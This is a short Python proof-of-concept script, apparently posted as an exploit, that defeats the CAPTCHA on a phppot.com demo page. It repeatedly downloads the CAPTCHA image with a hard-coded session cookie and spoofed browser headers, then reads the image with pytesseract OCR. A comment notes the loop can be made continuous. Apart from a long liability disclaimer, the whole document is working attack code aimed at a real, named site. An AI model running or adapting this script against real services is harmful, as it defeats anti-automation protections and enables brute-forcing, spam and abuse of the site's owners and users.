#!/bin/python3

# Title :  phppot CAPTCHA Solver
# Author : Ravindu Wickramasinghe - rvz ( @rvizx9 ) | www.zyenra.com 


# DISCLAIMER: 

# This proof-of-concept (POC) exploit is provided strictly for educational and research purposes. 
# It is designed to demonstrate potential vulnerabilities and assist in testing the security posture of software systems. 
# The author expressly disclaims any responsibility for the misuse of this code for malicious purposes or illegal activities. 
# Any actions taken with this code are undertaken at the sole discretion and risk of the user. 
# The author does not condone, encourage, or support any unauthorized access, intrusion, or disruption of computer systems. 
# Use of this POC exploit in any unauthorized or unethical manner is strictly prohibited. 
# By using this code, you agree to assume all responsibility and liability for your actions. 
# Furthermore, the author shall not be held liable for any damages or legal repercussions resulting from the use or misuse of this code. 
# It is your responsibility to ensure compliance with all applicable laws and regulations governing your use of this software. 
# Proceed with caution and use this code responsibly.

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

import requests
import time
import pytesseract
from PIL import Image
from io import BytesIO




def process_request(url, headers):
    start_time = time.time()
    response = requests.get(url, headers=headers)
    response_status_code = response.status_code
    image = Image.open(BytesIO(response.content))
    image_content = pytesseract.image_to_string(image)
    end_time = time.time()
    print(f"[request_no]: {request_count}, [status_code]: {response_status_code}, [time]: {end_time - start_time}, [captcha]: {image_content.strip()}")
    del image

url = 'https://phppot.com/demo/php-captcha/captcha_code.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Accept': 'image/avif,image/webp,*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://phppot.com/demo/php-captcha/',
    'Cookie': 'PHPSESSID=4664b7df84566cf26d868e979527f188',
    'Sec-Fetch-Dest': 'image',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'same-origin',
    'TE': 'trailers'
}

request_count = 1

while request_count <= 10: # change to True to send continous requests
    process_request(url, headers)
    request_count += 1
